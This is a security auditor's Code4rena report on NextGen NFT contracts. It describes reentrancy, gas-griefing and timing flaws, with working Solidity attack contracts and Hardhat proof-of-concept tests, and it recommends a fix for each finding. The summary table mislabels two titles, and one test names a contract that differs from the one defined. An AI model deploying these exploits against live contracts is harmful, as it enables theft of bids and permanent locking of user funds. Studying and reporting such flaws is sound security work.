# NextGen
NextGen context 30 Oct 2023 on code4rena, [!Context page](https://code4rena.com/audits/2023-10-nextgen)

## My Findings Summary

|ID|Title|Severity|
|--|-----|:------:|
|[H&#8209;01](#h-01-reentrancy-in-nextgencoremint-can-allow-users-to-mint-tokens-more-than-the-max-allowance)|Reentrancy in `NextGenCore::mint` can allow users to mint tokens more than the max allowance|HIGH|
|[H-02](#h-02-c4-nextgen-finding-auctiondemoclaimauction-is-subjected-to-an-out-of-gas-when-executing-because-of-6364-rule)|C4 NextGen finding: `AuctionDemo::claimAuction` is subjected to an `out of gas` when executing because of `63/64` rule|HIGH|
|[H-03](#h-03-invalid-time-validation-can-lead-make-auction-winners-claiming-the-auction-without-paying)|Reentrancy in `NextGenCore::mint` can allow users to mint tokens more than the max allowance|HIGH|
||||
|[M&#8209;01](#m-01-minting-before-burning-in-nextgencoreburntomint-leads-to-reentrancy-issues)|Reentrancy in `NextGenCore::mint` can allow users to mint tokens more than the max allowance|MEDIUM

---

## [H-01] Reentrancy in `NextGenCore::mint` can allow users to mint tokens more than the max allowance
### Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L198
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L182-L183

### Vulnerability details

#### Impact
In `NextGenCore`, users can mint tokens either in the airdrop period or the public sale period. But They are restricted by `maxCollectionPurchases` which restrict the number of tokens available for minting, to not exceed this limit.

This check can be bypassed, where the `NextGenCore` increases the tokens minted for the user after minting the token by safe minting functionality. So the minter, which can be a smart contract implementing `onERC721Received` function, can call `NextGenCore::mint` again, and the check of the maximum allowance will be passed.

```solidity
// NextGenCore::mint
// @audit [Reentrancy can make people mint more than the max allowed]
_mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
if (phase == 1) {
tokensMintedAllowlistAddress[_collectionID][_mintingAddress] =
    tokensMintedAllowlistAddress[_collectionID][_mintingAddress] +
    1;
} else {
tokensMintedPerAddress[_collectionID][_mintingAddress] =
    tokensMintedPerAddress[_collectionID][_mintingAddress] +
    1;
}
```

```solidity
// MinterContract::mint
require(
gencore.retrieveTokensMintedPublicPerAddress(col, msg.sender) + _numberOfTokens <=
    gencore.viewMaxAllowance(col),
"Max"
);
```


This problem is existed also in `NextGenCore::airDropTokens`. But since this function is only called by `MinterContract::airDropTokens` which is an admin-restricted call, It is kind of safe.
```solidity
// NextGenCore::airDropTokens
_mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);
tokensAirdropPerAddress[_collectionID][_recipient] = tokensAirdropPerAddress[_collectionID][_recipient] + 1;
```

#### Proof of Concept
I wrote a smart contract that can make this attack, here is the solidity code for the contract, The file is `attack/ReentrancyMint.sol` in `hardhat/smart-contracts`.

<details>
  <summary>Contract</summary>
  
  ```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {NextGenCore} from "../NextGenCore.sol";
import {MinterContract} from "../MinterContract.sol";

contract ReentrancyMint {
NextGenCore public immutable nextGenCore; // NextGen contract
MinterContract public immutable minter; // Minter contract

uint256 public collectionID; // The collection that is available for minting
uint256 public numberOfTokens; // Number of tokens to mint each iteration
uint256 public maxAllowance; // This parameter is only needed in allowlist sale
string public tokenData = '{"tdh": "100"}'; // Token data
address public mintTo; // The minter address (this is used only in airdrop sales)
bytes32[] public merkleProof = [bytes32(0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870)]; // merkle Tree
address public delegator = address(0); // Not needed

uint256 iterator; // Number of reentrant calls

// Deploy our contract, and set the minter and NextGenCore contracts addresses
constructor(address _nextGenCore, address _minter) {
    nextGenCore = NextGenCore(_nextGenCore);
    minter = MinterContract(_minter);
}

/// @notice Setting the information about the collection, and the number of tokens to be minted
/// @dev This function will be called before making the reentrancy attack
/// @dev I made this function to store the data passed to the `MinterContract::mint`, to use it again in `onERC721Received`
function setMintingFunctionData(uint256 _collectionID, uint256 _numberOfTokens, uint256 _maxAllowance) public {
    collectionID = _collectionID;
    numberOfTokens = _numberOfTokens;
    maxAllowance = _maxAllowance;
    mintTo = address(this);
}

/// @notice Call `MinterContract::mint` function
function mintToken() public {
    if (collectionID == 0) revert("Data is not set");
    minter.mint(collectionID, numberOfTokens, maxAllowance, tokenData, mintTo, merkleProof, delegator, 2);
}

/**
 * - call `MinterContract::mint` ->
 * - `NextGenCore::mint` ->
 * - `NextGenCore::_mintProcessing` ->
 * - `NextGenCore(ERC721)::_safeMint` ->
 * - `NextGenCore(ERC721)::_checkOnERC721Received` ->
 * - This function will get called at this point
 * - And our function will call `MinterContract::mint` again
 * - 4 iteration will be made
 *
 * */
function onERC721Received(address from, address to, uint256 tokenId, bytes memory data) external returns (bytes4) {
    // To mint 5 tokens only
    if (++iterator == 5) {
        return this.onERC721Received.selector;
    }
    // This contract will call `MinterContract::mint` again, and it will break the maxAllowance check
    if (collectionID > 0) {
        minter.mint(collectionID, numberOfTokens, maxAllowance, tokenData, mintTo, merkleProof, delegator, 2);
    }
    return this.onERC721Received.selector;
}
}
```


</details>


Then, I implemented a hardhat test to simulate the problem, you can copy/paste this test after `context("Get Price", ...)` block, in `nextGen.test.js` file.

<details>
  <summary>Testing js Script</summary>

```javascript
  context("Test `MinterContract::mint`", () => {
it("should allow re-entrancy in `NextGenCore::mint`", async () => {
    const [, , , , , , , , , , , , , hacker] = await ethers.getSigners();

    // Deploy ReentranctContract, that will make the attack
    const ReentrancyContract = await ethers.getContractFactory("ReentrancyMint");
    const reentrancyContract = await ReentrancyContract.connect(hacker).deploy(
        await contracts.hhCore.getAddress(),
        await contracts.hhMinter.getAddress()
    );

    // Collection 1 , which is declared previously by devs in the test file, have a maxAllowance for a user to 2 tokens.
    const collectionMaxAllowance = await contracts.hhCore.viewMaxAllowance(1);

    console.log(`Collection 1 has max Allowance: ${collectionMaxAllowance}`); // 2

    // We will set the data to make `reentrancyContract` mint 1 token each iteration
    await reentrancyContract.connect(hacker).setMintingFunctionData(1, 1, 0);

    /**
     * - collectionId = 1 is avaialble for minting
     * - The reentrancy contract will mint 5 tokens now by reentering `mint` before adding that the token was minted
     *
     * - The Attacker will simply make `ReentrancyMint` contract call `MinterContract::mint`
     * - After making checks, the `NextGenCore` will mint an NFT to it
     * - _safeMint() is used to mint, so the ERC721 will call `onERC721Received`, since its a contract
     * - Our contract will call `MinterContract::mint` again
     * - We didn't added tokens minted to the address, so the `ReentrancyMint` still has 0 tokens minted
     * - This loops will do 4 successive iterations
     * - After minting 4 times by `onERC721Received` + 1 time the beginning call then we called mint 5 times
     * - Each time we minted 1 tokens, so the `ReentrancyMint` minted 5 tokens
     * - The code will complete the stored uncompleted functions in the stack (like recursion), and add tokens minted
     * - The mintedTokens of the user will be set to 5, but its useless now, as the hacker minted 5 tokens and passed the check
     * - The minter passed The check successfully, well done
     */
    await reentrancyContract.connect(hacker).mintToken();

    const reentrancyContractMintedTokens = await contracts.hhCore.retrieveTokensMintedPublicPerAddress(
        1,
        await reentrancyContract.getAddress()
    );

    console.log(`The reenterancyContract has ${reentrancyContractMintedTokens} tokens minted`); // 5 Tokens
});
});
```
</details>


#### Tools Used
Manual Review + Hardhat

#### Recommended Mitigation Steps
You must make the changes in the contract before doing the minting process, The minting proccess should be the last step, all changes should be made before interaction, following the [CEI pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html).

```diff
// NextGenCore::mint
- _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
if (phase == 1) {
tokensMintedAllowlistAddress[_collectionID][_mintingAddress] =
    tokensMintedAllowlistAddress[_collectionID][_mintingAddress] +
    1;
} else {
tokensMintedPerAddress[_collectionID][_mintingAddress] =
    tokensMintedPerAddress[_collectionID][_mintingAddress] +
    1;
}
+ _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
```

It is better to change it in the airdrop too.

```diff
// NextGenCore::airDropTokens
- _mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);
tokensAirdropPerAddress[_collectionID][_recipient] = tokensAirdropPerAddress[_collectionID][_recipient] + 1;
+ _mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);
```

### Assessed type

Reentrancy

--- 

## [H-02] C4 NextGen finding: `AuctionDemo::claimAuction` is subjected to an `out of gas` when executing because of `63/64` rule

### Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116

### Vulnerability details

#### Impact
In `AuctionDemo::claimAuction`, the function can be permanently disabled, and it is subjected to revert with an `out of gas` reason, even if you submitted it with the max gas available in block size which is 30 million.

The function returns bids to the bidders, and the winner gets the NFT. So if one of the bidders consumes all the gas supplied to it, which will be `{initial gas * (63/64)^depth(=1)}`, there will be little gas left. This will affect transferring funds to the next bidders and the NFT to the winner, which makes it vulnerable to to `out of gas` revert.

If the bidder is a contract that consumes a lot of gas on receiving the ETH, as the snipped code below, It can disable claiming auction permanently.
```solidity
// The receiver will consume all gas provided to it {gas * (63/64)^depth(=1)}
receive() external payable {
  uint256 i;
  while (i < 1e9) {
      i++;
  }
}
```
We will discuss an example of when this bidder (gasWaster) participated in the auction two times (this is allowed in the Auction participating structure).
- Auction starts
- Bidders bid
- The gasWaster bid in two different places.
- Other bidders bid.
- Auction ends and one bidder wins.
- The Winner Called `AuctionDemo::claimAuction` function with `30M` as gas for the tx (the maximum available amount)
- The function will go in for loop, sending eth to the bidders.
- First, it will send ETH to the gasWaster address (which has a receive function that wastes all gas as that in the snipped code).
- After some calls, it will send ETH to the gasWaster again (he participated two times).
- The gasWaster addresses consumed all the gas, and no remaining gas for the other calls nor for transferring the NFT to the winner.
- The function will revert with `out of gas` when submitting max available gas, making the function disabled permanently.

**Here is the amount of gas that will left after sending ETH to the gasWaster in the first and second time.**

- The values in the table are when the gasWaster is the first and second bidder.
- Gas values are not 100% accurate, but it's not a problem, since They are for illustration only.

Bidder|Avaialbe Gas|Calculate the sent gas|Gas Used|Remaning Gas|
------|------------|----------------------|--------|------------|
1|30,000,000|30,000,000 * (63/64)^1|29,531,250|468,750|
2|468,750|468,750 * (63/64)^1|461,426|7,324|

7,324 gas left from 30M! This will not make any other external call occur, the function reverts with an `out of gas` error.

We are calling the function with the maximum amount of gas available, so we can't increase the gas above this value.

The function is totally locked, no one can call it, it is subjected to a DoS attack on the blockchain (EVM) level not just the smart contract level.

The problems that will occur:
- The winner can't claim his reward and pays too much gas for nothing.
- Bidders' ETH is locked permanently in the contract, and no way to get it back.

As we saw the gas used by the gasWaster is ~`29,531,250`, leaving ~`461,426` in the first call.

I tested when the function will revert with `out of gas` in case the gasWaster participated only one time, it gives me that it will revert after ~28 calls after the gasWaster call, this number is the maximum it can't afford, it can revert before this depending on the gasWaster call position.

_**NOTE**: This problem is not the same as the unchecked call problem submitted by the bot. The `out of gas`, will not get solved by checking on the resulting value. If we add the check on success (as the bot report said), we will revert because of the `out of gas` from the external contract. So the function will revert with the reason `external call failed` when adding the bot suggestion. And if the function is left unchecked, which is good in this function especially, the function can revert with `out of gas`. No way to escape from this situation._


**Why does a person pay ETH to just spoil the auction**

The problem in the contract is that it's not a normal `out of gas` and locked ETH, as there are a lot of things that can encourage hackers to make this attack, as they will gain profit from it.

The hacker can lock a valuable NFT auction, and ask the winner for money to allow the function (`claimAuction`) to fire, here is an example:
```solidity
receive() external payable {
uint256 i;
if (lockAuction /* gasWaster control this variable in the contract */) {
  while (i < 1e9) {
      i++;
  }
}
}
```

Artists will have to pay to rescue the auction and people's funds by paying money to the hacker, as some NFTs worth millions.

**The problems that will affect the protocol and business**
- Users will lose their money, making them leave the protocol.
- Less trust in the protocol.
- NFT prices may drop, as the adoption will decrease.

_**NOTE**:`1/64` and gas problems lie at a medium level in most cases, but the problem is that in this contract, it will cause a lot of losses, and break the Protocol's main functionality, which is auctioning valuable NFTs. So I made it a HIGH bug since the protocol service will crash because of it._

#### Proof Of Concept

I wrote a smart contract that can make this attack, here is the solidity code for the contract, The file is `attack/GasWastageAuctioneer.sol` in `hardhat/smart-contracts`.

<details>
  <summary>Contract</summary>
  
  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {AuctionDemo} from "../AuctionDemo.sol";

contract GasWastageAuctioneer {
  AuctionDemo public immutable auctionContract; // NextGen contract

  // Deploy our contract, and set the minter and NextGenCore contracts addresses
  constructor(address _auctionContract) {
      auctionContract = AuctionDemo(_auctionContract);
  }

  // Wasting gas with receiving ETH
  receive() external payable {
      uint256 i;
      // The hacker can make a condition which gives him the possibility
      // to bargain for the cancellation of gas wastage in exchange for money
      while (i < 1e9) {
          i++;
      }
  }

  // gasWaster participate to auction
  function participateInAuction(uint256 _tokenId) external payable {
      auctionContract.participateToAuction{value: msg.value}(_tokenId);
  }
}
```

</details>

Then, I implemented a hardhat test to simulate the problem, you can copy/paste this test after `context("Get Price", ...)` block, in `nextGen.test.js` file.

<details>
  <summary>Testing js script</summary>
  
  ```javascript
context("Test `AuctionDemo::claimAuction`", () => {
  it("It should block the `AuctionDemo::claimAuction` permenantly through `out of gas` error", async () => {
      const [, , , , , , , , , , , , , receipent, bidder1, bidder2, gasWaster] = await ethers.getSigners();

      const ONE_DAY = 24 * 60 * 60;
      const ONE_TENTH_ETHER = 100000000000000000n;

      // Deploy Auction contract
      const auction = await ethers.getContractFactory("AuctionDemo");
      const hhAuction = await auction.deploy(
          await contracts.hhMinter.getAddress(),
          await contracts.hhCore.getAddress(),
          await contracts.hhAdmin.getAddress()
      );

      // Deploy GasWastageBidder, that will make the attack
      const GasWastageBidder = await ethers.getContractFactory("GasWastageBidder");
      const gasWastageBidder = await GasWastageBidder.connect(gasWaster).deploy(await hhAuction.getAddress());

      // Get the current block.timestamp
      const blockNumber = await ethers.provider.getBlockNumber();
      const block = await ethers.provider.getBlock(blockNumber);
      const currentTimestamp = block.timestamp;

      // This token will be the third token, where two have been minted in the previous `context`
      await contracts.hhMinter.mintAndAuction(
          receipent.address, // receipent address
          '{"tdh": "100"}', // _tokenData
          2, //_varg0
          3, // _collectionID
          currentTimestamp + ONE_DAY * 7 // 7 days (The auction period)
      );

      // The tokenId of the NFT auctioned
      const auctionTokenId =
          (await contracts.hhCore.viewTokensIndexMin(3)) + (await contracts.hhCore.viewCirSupply(3)) - BigInt(1);

      // The gasWaster participated in the auction First in 1st and 2nd positions in the auction, and placed .1 ether
      await gasWastageBidder.connect(gasWaster).participateInAuction(auctionTokenId, { value: ONE_TENTH_ETHER });

      // Comment/remove this code (the second gasWaster participation) to prevent `out of gas revert` and see the gas usage
      await gasWastageBidder
          .connect(gasWaster)
          .participateInAuction(auctionTokenId, { value: ONE_TENTH_ETHER + BigInt(1) });

      // Another peaple participater in the auction (+another 10 Bids)
      for (let i = 1; i <= 4; i++) {
          const bidder1Value = BigInt(i * 2); // 2, 4, 6, 8, 10
          const bidder2Value = BigInt(i * 2) + BigInt(1); // 3, 5, 7, 9, 11
          await hhAuction
              .connect(bidder1)
              .participateToAuction(auctionTokenId, { value: ONE_TENTH_ETHER * bidder1Value });
          await hhAuction
              .connect(bidder2)
              .participateToAuction(auctionTokenId, { value: ONE_TENTH_ETHER * bidder2Value });
      }

      // Auciton ended, and bidder2 is the winner
      await network.provider.send("evm_increaseTime", [ONE_DAY * 8]);
      await network.provider.send("evm_mine", []);

      // The receipent is a trust EOA owner by NextGenTeam, and they will make the AuctionDemo has approval
      // for the token, in order to transfer it to the winner
      const hhAuctionAddress = await hhAuction.getAddress();
      await contracts.hhCore.connect(receipent).approve(hhAuctionAddress, auctionTokenId);

      // bidder2 wants to claim the auction, gasLimit is 30 million (maximimum amount of gas)
      const tx = await hhAuction.connect(bidder2).claimAuction(auctionTokenId, { gasLimit: 30_000_000 });
      const txReceipt = await tx.wait();

      // This part will be reached only if the gasWaster participated only one time
      const gasUsedInETH = txReceipt.gasUsed * txReceipt.gasPrice;
      console.log(
          `Gas used by the winner to claim his prize: ${txReceipt.gasUsed} gas = ${ethers.formatEther(
              gasUsedInETH.toString()
          )} ETH`
      );
  });
});
```


</details>

This js test script will give the following error `Transaction ran out of gas`, disabling the claiming auction permanently.

_Keep in mind that the javascript script will make two while loops each making 1 billion iterations. The transaction will revert (internally from the blockchain, not the js script itself) before completing these iterations. If your PC has an old processor, you can terminate the process if you find the PC goes hotter._

#### Tools Used
Manual Review + Hardhat

#### Recommended Mitigation Steps

There are two solutions to this problem:
- Disallowing contracts from participating in the auction.
- Restrict the gas passed to the bidders (external calls).

### Disallowing contracts from participating in the auction

Simple, we can check for the caller of the `AuctionDemo::participateToAuction` function, and revert if it is a contract.
```diff
// AuctionDemo
function participateToAuction(uint256 _tokenid) public payable {
+   address sender = msg.sender;
+   uint256 codeSize;
+   assembly {
+       codeSize := extcodesize(sender)
+   }
+   require(codeSize == 0, "Contracts are not allowed");
  require(
      msg.value > returnHighestBid(_tokenid) &&
          block.timestamp <= minter.getAuctionEndTime(_tokenid) &&
          minter.getAuctionStatus(_tokenid) == true
  );
  auctionInfoStru memory newBid = auctionInfoStru(msg.sender, msg.value, true);
  auctionInfoData[_tokenid].push(newBid);
}
```
**NOTE**: this check is not enough to check if the caller is a contract or not, as `extcodesize(sender)` returns 0 in the following cases:
- an externally-owned account.
- a contract in construction.
- an address where a contract will be created.
- an address where a contract lived, but was destroyed.

So it is not the best check, and the problem still can happen if the contract was in the construction for example.

### Restrict the gas passed to the bidders (external calls)

Although restricting gas passed is not the best practice, it will solve the problem we are facing.

Instead of forwarding all the gas (`63/64`) to the external call, we will restrict it by a given value, since it's just sending ETH to an address, the gas cost will be relatively constant ~`21000`. So we can pass 50k to be sure that the normal transfer will be made successfully.

```diff
// AuctionDemo::claimAuction -> else if block

// Make the gas equals 50_000 if gasLeft is greater than 50_000
+ uint256 gasForwarded = gasleft() < 50_000 ? gasleft() : 50_000;

(bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{
  value: auctionInfoData[_tokenid][i].bid,
+   gas: gasForwarded
}("");
emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
```

Now, if the receiver (gasWaster) consumed all the gas, he would not take the money, not affecting other bidders.

Auction biddings will be passed successfully, and the gasWaster is the person who will get punished.

_There is no way to recover failed transactions, and `AuctionDemo` has no function to withdraw ETH in case of a problem, but this is not the problem we are discussing._

### One last thing

_As we said before, listening to bots' suggestions and checking this function `AuctionDemo::claimAuction` will make the auction vulnerable to a DoS attack, so the devs should keep this in mind. Here's the scenario_
```solidity
receive() external payable {
  revert("Break auction");
}
```


### Assessed type

DoS

---

## [H-03] Invalid time validation can lead make auction winners claiming the auction without paying.

### Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L105
https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L125


### Vulnerability details

#### Impact

In `AuctionDemo::claimAuction` contract, the timing check checks that the timestamp equals or greater than the auction ending time.
```solidity
// @audit [M: The winner can fire `claimAuction` and `cancelBid` at the exact time of ending
//        causing The winner to claim the NFT without paying, the the bidder to withdraw two times]
require(
block.timestamp >= minter.getAuctionEndTime(_tokenid) &&
    auctionClaim[_tokenid] == false &&
    minter.getAuctionStatus(_tokenid) == true
);
```

And in `AuctionDemo::cancelBid` or `AuctionDemo::cancelAllBids`, the timing check checks that the timestamp is smaller than or equal to the auction ending time.
```solidity
require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
```

So if the winner fired the `claimAuction()` and the `cancelBid()` function at the timestamp of the ending of the auction. He can claim the auction (get the NFT), and cancel his bid too.

- If the auction ending time is `1700324322`.
- The winner fired the `claimAuction()` then `cancelBid()` at the timestamp `1700324322`.
- The winner claimed the NFT and refunded his bid too.

The likelihood of this problem occurring is very low, as it should occur at the exact timestamp of the ending of the auction.

If the winner made this (fired the two functions through a contract) at a random time, and luckily the block miner set the timestamp at the exact auction ending time of the auction, The attack will take place.

The block time is ~11-13 sec, so it may occur who nows.

Miners can do this attack too, but as we said it is scarcely to happen.

#### Proof of Concept
I wrote a smart contract that can make this attack, here is the solidity code for the contract, The file is `attack/ClaimWithoutPay.sol` in `hardhat/smart-contracts`.

<details>
  <summary>Contract</summary>
  
  ```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {AuctionDemo} from "../AuctionDemo.sol";

contract ClaimWithoutPay {
AuctionDemo public immutable auctionDemo; // Auction contract

// Deploy our contract, and set Auction address
constructor(address _auctionDemo) payable {
    auctionDemo = AuctionDemo(_auctionDemo);
}

// To receive ether
receive() external payable {}

// participating in auction
function participateToAuction(uint256 _tokenId) public payable {
    auctionDemo.participateToAuction{value: msg.value}(_tokenId);
}

// Claim the auction, and cancel our bid
function claimWithoutPay(uint256 _token, uint256 _index) public {
    auctionDemo.claimAuction(_token);
    auctionDemo.cancelBid(_token, _index);
}

// To accept the NFT, when receiving it
function onERC721Received(address from, address to, uint256 tokenId, bytes memory data) external returns (bytes4) {
    return this.onERC721Received.selector;
}
}
```


</details>


I implemented a hardhat test to simulate the problem, you can copy/paste this test after `context("Get Price", ...)` block, in `nextGen.test.js` file.

<details>
  <summary>Testing js script</summary>
  
  ```javascript
context("Test `AuctionDemo`", () => {
it("should allow The winner to claim his prize, and ", async () => {
    const [, , , , , , , , , , , , , receipent, bidder1, bidder2, winner] = await ethers.getSigners();
    // Deploy Auction Contract
    const auction = await ethers.getContractFactory("AuctionDemo");
    const hhAuction = await auction.deploy(
        await contracts.hhMinter.getAddress(),
        await contracts.hhCore.getAddress(),
        await contracts.hhAdmin.getAddress()
    );

    const ONE_DAY = 24 * 60 * 60;
    const ONE_ETHER = 1000000000000000000n;

    // Deploy `ClaimWithoutPay` which will be the winner, and claim the auction without bidding
    const ClaimWithoutPay = await ethers.getContractFactory("ClaimWithoutPay");
    const claimWithoutPayContract = await ClaimWithoutPay.deploy(await hhAuction.getAddress(), {});

    // Get the current block.timestamp
    const blockNumber = await ethers.provider.getBlockNumber();
    const block = await ethers.provider.getBlock(blockNumber);
    const currentTimestamp = block.timestamp;

    // This token will be the third token, where two tokens have been minted in the previous `context`
    await contracts.hhMinter.mintAndAuction(
        receipent.address, // receipent address
        '{"tdh": "100"}', // _tokenData
        2, //_varg0
        3, // _collectionID
        currentTimestamp + ONE_DAY * 7 // 7 days
    );

    // The tokenId of the NFT auctioned
    const auctionTokenId =
        (await contracts.hhCore.viewTokensIndexMin(3)) + (await contracts.hhCore.viewCirSupply(3)) - BigInt(1);

    // bidder1 participates in auction, and placed 1 ether
    await hhAuction.connect(bidder1).participateToAuction(auctionTokenId, { value: ONE_ETHER });

    // bidder2 participates in auction, and placed 2 ether
    await hhAuction.connect(bidder2).participateToAuction(auctionTokenId, { value: ONE_ETHER * BigInt(2) });

    // `claimWithoutPayContract` contract (The winner) participates in the auction, and placed 3 ether
    await claimWithoutPayContract
        .connect(winner)
        .participateToAuction(auctionTokenId, { value: ONE_ETHER * BigInt(3) });

    // The receipent is a trust EOA owner by NextGenTeam, and they will make the AuctionDemo has approval
    // for the token, in order to transfer it to the winner
    await contracts.hhCore.connect(receipent).approve(await hhAuction.getAddress(), auctionTokenId);

    // Before doing the attack, the contract `AuctionDemo` should has money, after `claiming auction`
    // This will occuar if there is more than one auction in the `AuctionDemo`
    //
    // This token will be the fourth token, where two tokens have been minted in the previous `context`
    // The second auction, is used to make the contract `AuctionDemo` has balance from the two auctions
    // And the steal can occuars
    await contracts.hhMinter.mintAndAuction(
        receipent.address, // receipent address
        '{"tdh": "100"}', // _tokenData
        2, //_varg0
        3, // _collectionID
        currentTimestamp + ONE_DAY * 14 // 14 days
    );
    // The second auctioned token exceeds the previous token by 1.
    // We made this second auction, and made a bid with 3 ETH, so that there will be excessive 3 ETH
    // in `AuctionDemo` when claiming the auction 1.
    await hhAuction
        .connect(bidder1)
        .participateToAuction(auctionTokenId + BigInt(1), { value: ONE_ETHER * BigInt(3) });

    // The balance of the `claimWithoutPayContract` before claiming
    let claimWithoutPayContractBalance = await ethers.provider.getBalance(
        await claimWithoutPayContract.getAddress()
    );
    console.log(`The balance of the 'ClaimWithoutPay' contract : ${claimWithoutPayContractBalance}`);

    const auctionEndingTime = await contracts.hhMinter.getAuctionEndTime(auctionTokenId);

    // Get the current time
    const blockNumber2 = await ethers.provider.getBlockNumber();
    const block2 = await ethers.provider.getBlock(blockNumber2);
    const currentTimestamp2 = block2.timestamp;

    const timeDifference = Number(auctionEndingTime) - currentTimestamp2;

    // The auction period is 7 days, and an exact 7 days has been passed.
    // EX: if the auction ends at `1700324322`, we will make the transaction at timestamp = `1700324322`
    await network.provider.send("evm_increaseTime", [timeDifference - 1]);
    await network.provider.send("evm_mine", []);

    /**
     * --> Now lets see `AuctionDemo` balance
     * - From auction 1 --> (1 ETH, 2 ETH, 3 ETH) - Total 6 ETH
     * - From auction 2 --> (3 ETH) = Total 3 ETH
     * - So the total balance of the `AuctionDemo` is 9 ETH
     * - When claiming auction 1, the refunds will go to bidder 1 and bidder 2 (-3 ETH)
     * - transfereing the NFT to the winner
     * - Transfere the winner bid to the devs (-3 ETH)
     *
     * ---> AuctionDemo should not do anything else, and it should contains 3 ETH in balance from teh auction 2
     *
     * - What will occuar is that the winner itself will also withdraw his balance (-3 ETH)
     * - The winner will cancel his bid, after claiming
     * - So `AuctionDemo` contract will have 0 ETH in claiming the first auction instead of 3 ETH.
     */

    await claimWithoutPayContract.connect(winner).claimWithoutPay(auctionTokenId, 2);
    console.log(await claimWithoutPayContract.getAddress());

    claimWithoutPayContractBalance = await ethers.provider.getBalance(
        await claimWithoutPayContract.getAddress()
    );
    console.log(`The balance of the 'ClaimWithoutPay' contract : ${claimWithoutPayContractBalance}`); // 3 ETH
    console.log(`Owner of auctioned token: ${await contracts.hhCore.ownerOf(auctionTokenId)}`); // 0x84eA74d481Ee0A5332c457a4d796187F6Ba67fEB
    console.log(`Auction Demo balance; ${await ethers.provider.getBalance(await hhAuction.getAddress())}`); // 0
});
});
```

</details>

#### Tools Used
Manual Review + Hardhat

#### Recommended Mitigation Steps
One condition should remove the equal sign, to prevent this kind of thing from happening.

We will update the `AuctionDemo::claimAuction` function and make it available for claiming after the ending period by 1 second.
```diff
require(
-   block.timestamp >= minter.getAuctionEndTime(_tokenid) &&
+   block.timestamp > minter.getAuctionEndTime(_tokenid) &&
    auctionClaim[_tokenid] == false &&
    minter.getAuctionStatus(_tokenid) == true
);
```

So the person can not cancel the bid at the time of claiming, as they do not overlap at any time.

### Assessed type

Invalid Validation

---

## [M-01] Minting Before burning in `NextGenCore::burnToMint` leads to reentrancy issues

### Lines of code

https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/NextGenCore.sol#L218-L221

### Vulnerability details

#### Impact

In `NextGenCore::burnToMint` function, which is used to mint a token by burning another token, the minting for the new token happens before burning the burned token. The minting is done through `safeMint()` function. So the minter can use the token before burning it in another position, leading to some problems.

The user can reuse the token to mint another token, where the token is not burned yet. But since `burn()` function reverts if the token does not exist, minting more than one token using the same burned token can't occur.

The problem that can occur is that the user can use this token, in an NFT trading platform for example. So it will be listed for sailing without actually being owned by anyone.

Another problem, it can be listed for auction before burning in a public NFT marketplace like Opensea or Rarible, and the auctions and sales will not work, since the token does not even exist.

There are other problems that can happen that we can't predict since you are giving the minter the freedom to use the NFT (burned token) before burning it.


#### Proof of Concept

As it's clear in the snipped code the minting is done, then the burning.
```solidity
// NextGenCore::burnToMint
_mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);

// burn token
_burn(_tokenId);
```

`_mintProcessing()` calls `_safeMint()` function, which is existed in `ERC721`.
```solidity
// NextGenCore::_mintProcessing
function _mintProcessing( ... ) internal {
tokenData[_mintIndex] = _tokenData;
collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);
tokenIdsToCollectionIds[_mintIndex] = _collectionID;
_safeMint(_recipient, _mintIndex);
}
```

`_safeMint()` checks if the receiver is a contract or not, and it fires `onERC721Received` on it.
```solidity
// ERC721::_checkOnERC721Received
if (to.isContract()) {
try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {
    return retval == IERC721Receiver.onERC721Received.selector;
} catch (bytes memory reason) { ... }
} else { ... }
```

Now the receiver, a smart contract with `onERC721Received` function, can do anything with the NFT with the burned tokenId before burning it.
```solidity
contract ReentrancyBurnToMint {
...

function onERC721Received(address from, address to, uint256 tokenId, bytes memory data) external returns (bytes4) {
    // Do any thing with the burned token
    return this.onERC721Received.selector;
}
}
```


#### Tools Used
Manual Review

#### Recommended Mitigation Steps

Burn before minting the new token, to make minting the last step. This will secure the protocol from reentrancy before burning the token.

```diff
// NextGenCore::burnToMint -> if block
- _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);

// burn token
_burn(_tokenId);
burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;

// mint the token in the last step
+ _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);
```

### Assessed type

Reentrancy
